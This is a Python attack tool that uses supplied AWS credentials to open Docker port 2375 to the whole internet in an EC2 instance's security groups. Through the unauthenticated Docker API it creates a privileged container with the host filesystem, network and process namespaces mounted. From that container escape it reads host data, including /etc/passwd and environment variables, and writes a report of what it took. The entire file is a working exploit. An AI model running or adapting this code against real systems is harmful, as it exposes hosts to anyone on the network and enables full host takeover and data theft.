import boto3
import requests
import json
import time
import argparse
from datetime import datetime


def check_and_open_port(access_key, secret_key, region, instance_id, port=2375):
    """Check and open port 2375 in security groups"""
    ec2 = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

    # Get instance security groups
    response = ec2.describe_instances(InstanceIds=[instance_id])
    instance = response['Reservations'][0]['Instances'][0]
    security_groups = instance['SecurityGroups']

    port_open = False
    for sg in security_groups:
        sg_id = sg['GroupId']

        # Check if port is already open
        sg_detail = ec2.describe_security_groups(GroupIds=[sg_id])['SecurityGroups'][0]
        for rule in sg_detail['IpPermissions']:
            if rule.get('FromPort') == port and rule.get('ToPort') == port:
                port_open = True
                break

        # Open port if not already open
        if not port_open:
            try:
                ec2.authorize_security_group_ingress(
                    GroupId=sg_id,
                    IpPermissions=[{
                        'IpProtocol': 'tcp',
                        'FromPort': port,
                        'ToPort': port,
                        'IpRanges': [{'CidrIp': '0.0.0.0/0'}]
                    }]
                )
                print(f"Port {port} opened in {sg_id}")
                port_open = True
            except Exception as e:
                if 'already exists' not in str(e):
                    print(f"Failed to open port: {e}")

    return port_open


def get_or_create_privileged_container(docker_host, port=2375):
    """Get existing or create new privileged container"""
    base_url = f"http://{docker_host}:{port}"

    # Check existing containers
    response = requests.get(f"{base_url}/containers/json?all=true")
    if response.status_code == 200:
        containers = response.json()
        for container in containers:
            # Check if container is privileged
            inspect_response = requests.get(f"{base_url}/containers/{container['Id']}/json")
            if inspect_response.status_code == 200:
                config = inspect_response.json()
                if config.get('HostConfig', {}).get('Privileged', False):
                    container_id = container['Id']
                    print(f"Using existing privileged container: {container_id[:12]}")

                    # Start if not running
                    if container['State'] != 'running':
                        requests.post(f"{base_url}/containers/{container_id}/start")
                    return container_id

    # Create new privileged container
    print("Creating new privileged container...")

    # Pull alpine image
    requests.post(f"{base_url}/images/create?fromImage=alpine:latest")

    container_config = {
        "Image": "alpine:latest",
        "Cmd": ["/bin/sh", "-c", "tail -f /dev/null"],
        "HostConfig": {
            "Privileged": True,
            "NetworkMode": "host",
            "PidMode": "host",
            "Binds": ["/:/host:rw", "/proc:/host/proc:rw", "/sys:/host/sys:rw"]
        }
    }

    create_response = requests.post(
        f"{base_url}/containers/create",
        json=container_config,
        headers={'Content-Type': 'application/json'}
    )

    if create_response.status_code == 201:
        container_id = create_response.json()['Id']
        requests.post(f"{base_url}/containers/{container_id}/start")
        print(f"Created privileged container: {container_id[:12]}")
        return container_id

    return None


def execute_command(docker_host, container_id, command, port=2375):
    """Execute command in container"""
    base_url = f"http://{docker_host}:{port}"

    exec_config = {
        "AttachStdout": True,
        "AttachStderr": True,
        "Cmd": ["/bin/sh", "-c", command]
    }

    exec_response = requests.post(
        f"{base_url}/containers/{container_id}/exec",
        json=exec_config,
        headers={'Content-Type': 'application/json'}
    )

    if exec_response.status_code == 201:
        exec_id = exec_response.json()['Id']
        start_response = requests.post(
            f"{base_url}/exec/{exec_id}/start",
            json={"Detach": False, "Tty": False},
            headers={'Content-Type': 'application/json'}
        )

        if start_response.status_code == 200:
            return start_response.text.strip()

    return "Command execution failed"


def collect_host_information(docker_host, container_id):
    """Collect host system information"""
    commands = [
        ("Host Information", "uname -a"),
        ("User Accounts", "cat /host/etc/passwd | head -10"),
        ("Running Processes", "ps aux | head -20"),
        ("Network Interfaces", "ip addr show"),
        ("Network Connections", "netstat -tuln | head -15"),
        ("Disk Usage", "df -h"),
        ("Memory Information", "cat /host/proc/meminfo | head -10"),
        ("CPU Information", "cat /host/proc/cpuinfo | head -20"),
        ("Host Filesystem", "ls -la /host/"),
        ("Docker Processes", "ps aux | grep docker"),
        ("Kernel Modules", "lsmod | head -10"),
        ("Environment Variables", "env | head -10")
    ]

    collected_data = {}
    for desc, cmd in commands:
        print(f"Collecting: {desc}")
        output = execute_command(docker_host, container_id, cmd)
        collected_data[desc] = output

    return collected_data


def generate_report(docker_host, instance_id, container_id, collected_data):
    """Generate markdown report"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    report = f"""# EC2 Docker Container Escape Analysis Report

## Target Information
- EC2 Instance: {instance_id}
- Docker Host: {docker_host}:2375
- Container ID: {container_id[:12]}
- Timestamp: {timestamp}

## Container Configuration
- Privileged Mode: Enabled
- Network Mode: host
- PID Mode: host
- Host Filesystem: Mounted at /host
- Security: All capabilities enabled

## Collected Host Information
"""

    for category, data in collected_data.items():
        report += f"\n### {category}\n```\n{data}\n```\n"

    report += """
## Analysis Summary
Container escape successful through privileged Docker container with host namespace access.
Complete host system information extracted via mounted filesystem and shared process namespace.
"""

    filename = f"ec2_docker_escape_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
    with open(filename, 'w') as f:
        f.write(report)

    print(f"Report generated: {filename}")
    return filename


def main():
    parser = argparse.ArgumentParser(description='EC2 Docker Container Escape')
    parser.add_argument('--access-key', required=True, help='AWS Access Key')
    parser.add_argument('--secret-key', required=True, help='AWS Secret Key')
    parser.add_argument('--region', required=True, help='AWS Region')
    parser.add_argument('--instance-id', required=True, help='EC2 Instance ID')

    args = parser.parse_args()

    print("EC2 Docker Container Escape Analysis")
    print("=" * 40)

    # Get instance public IP
    ec2 = boto3.client('ec2', aws_access_key_id=args.access_key,
                       aws_secret_access_key=args.secret_key, region_name=args.region)
    response = ec2.describe_instances(InstanceIds=[args.instance_id])
    instance = response['Reservations'][0]['Instances'][0]
    docker_host = instance.get('PublicIpAddress') or instance.get('PrivateIpAddress')

    print(f"Target: {docker_host}")

    # Step 1: Check and open port 2375
    print("\n1. Checking security group...")
    check_and_open_port(args.access_key, args.secret_key, args.region, args.instance_id)

    # Wait for port to be available
    time.sleep(5)

    # Step 2: Get or create privileged container
    print("\n2. Setting up privileged container...")
    container_id = get_or_create_privileged_container(docker_host)

    if not container_id:
        print("Failed to create privileged container")
        return

    # Wait for container to be ready
    time.sleep(3)

    # Step 3: Collect host information
    print("\n3. Collecting host information...")
    collected_data = collect_host_information(docker_host, container_id)

    # Step 4: Generate report
    print("\n4. Generating report...")
    generate_report(docker_host, args.instance_id, container_id, collected_data)

    print("\nAnalysis complete!")


if __name__ == "__main__":
    main()